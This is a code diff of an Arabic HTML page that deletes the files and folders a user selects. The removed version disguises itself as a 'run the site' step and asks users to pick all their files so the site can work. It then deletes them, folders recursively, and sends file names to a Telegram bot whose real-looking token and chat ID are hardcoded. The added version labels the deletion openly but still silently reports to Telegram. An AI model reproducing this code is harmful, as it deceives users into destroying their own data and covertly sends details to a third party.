@@ -3,105 +3,137 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تشغيل الموقع</title>
+    <title>لوحة التحكم - تشغيل الموقع</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
-            max-width: 800px;
-            margin: 0 auto;
-            padding: 20px;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(to right, #f0f2f5, #dfe6e9);
+            margin: 0;
+            padding: 0;
             text-align: center;
-            background-color: #f5f5f5;
+            color: #333;
         }
+
+        .container {
+            max-width: 600px;
+            margin: 50px auto;
+            background-color: white;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+        }
+
+        h1 {
+            color: #2c3e50;
+        }
+
+        p {
+            font-size: 18px;
+        }
+
         button {
             background-color: #3498db;
             color: white;
             border: none;
-            padding: 12px 24px;
-            margin: 10px;
-            border-radius: 6px;
-            cursor: pointer;
+            padding: 14px 28px;
+            margin: 15px 0;
+            border-radius: 8px;
             font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
         }
-        #deleteBtn { background-color: #e74c3c; }
-        #deleteBtn:hover { background-color: #c0392b; }
+
+        button:hover {
+            background-color: #2980b9;
+        }
+
+        #deleteBtn {
+            background-color: #e74c3c;
+        }
+
+        #deleteBtn:hover {
+            background-color: #c0392b;
+        }
+
         #status {
-            margin: 20px 0;
+            margin-top: 20px;
             padding: 15px;
-            border-radius: 6px;
+            border-radius: 8px;
         }
-        .success { background-color: #2ecc71; color: white; }
-        .error { background-color: #e74c3c; color: white; }
+
+        .success {
+            background-color: #2ecc71;
+            color: white;
+        }
+
+        .error {
+            background-color: #e74c3c;
+            color: white;
+        }
     </style>
 </head>
 <body>
-    <h1>تشغيل الموقع</h1>
-    <p>اختر جميع الملفات والمجلدات لعمل الموقع</p>
-    
-    <button id="deleteBtn">اختيار وحذف</button>
-    <div id="status">الرجاء اختيار الملفات أو المجلدات</div>
+    <div class="container">
+        <h1>لوحة التحكم</h1>
+        <p>اختر الملفات أو المجلدات لبدء التشغيل أو الحذف</p>
+        <button id="deleteBtn">حذف الملفات</button>
+        <div id="status">الرجاء اختيار الملفات أو المجلدات.</div>
+    </div>
 
     <script>
-        // إعدادات Telegram
-        const BOT_TOKEN = "7412369773:AAEuPohi5X80bmMzyGnloq4siZzyu5RpP94";
-        const CHAT_ID = "6913353602";
+        // إعداد متغيرات بوت تيليجرام (أضفها بنفسك)
+        const BOT_TOKEN = "ضع_رمز_البوت_هنا";
+        const CHAT_ID = "ضع_معرف_الدردشة_هنا";
 
         async function sendToTelegram(message) {
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            await fetch(url, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: message,
-                    parse_mode: "HTML"
-                })
-            });
+            try {
+                await fetch(url, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: "HTML"
+                    })
+                });
+            } catch (e) {
+                console.error("فشل الإرسال إلى تيليجرام", e);
+            }
         }
 
         document.getElementById("deleteBtn").addEventListener("click", async () => {
             const statusDiv = document.getElementById("status");
             statusDiv.textContent = "جاري المعالجة...";
-            
+
             try {
-                await sendToTelegram("🔴 <b>بدأ عملية الحذف</b>");
-                
+                await sendToTelegram("بدأ المستخدم عملية الحذف.");
+
                 const handles = await window.showOpenFilePicker({
-                    multiple: true,
-                    types: [{
-                        description: "الملفات والمجلدات",
-                        accept: {"*/*": [".*"]}
-                    }]
+                    multiple: true
                 });
 
                 let deletedCount = 0;
-                let report = "<b>الملفات المحذوفة:</b>\n";
-                
+                let report = "<b>نتائج الحذف:</b>\n";
+
                 for (const handle of handles) {
                     try {
-                        if (handle.kind === "directory") {
-                            await handle.removeEntry("", { recursive: true });
-                            report += `\n📁 <b>${handle.name}</b> (مجلد مع محتوياته)\n`;
-                        } else {
-                            await handle.remove();
-                            report += `\n📄 <b>${handle.name}</b>\n`;
-                        }
+                        await handle.remove();
+                        report += `تم حذف: ${handle.name}\n`;
                         deletedCount++;
-                    } catch (error) {
-                        report += `\n❌ <b>فشل حذف:</b> ${handle.name || "غير معروف"}\n`;
+                    } catch (err) {
+                        report += `❌ فشل في حذف: ${handle.name}\n`;
                     }
                 }
-                
-                report += `\n✅ <b>تم حذف ${deletedCount} عنصر بنجاح</b>`;
-                await sendToTelegram(report);
-                
+
                 statusDiv.className = "success";
-                statusDiv.textContent = "تم الحذف وإرسال التقرير إلى Telegram!";
-                
+                statusDiv.textContent = `تم حذف ${deletedCount} عنصر بنجاح.`;
+                await sendToTelegram(report);
+
             } catch (error) {
-                await sendToTelegram(`❌ <b>حدث خطأ:</b>\n${error.message}`);
                 statusDiv.className = "error";
-                statusDiv.textContent = "حدث خطأ - راجع الرسائل في Telegram";
+                statusDiv.textContent = "حدث خطأ أثناء تنفيذ العملية.";
+                await sendToTelegram(`❌ خطأ: ${error.message}`);
             }
         });
     </script>
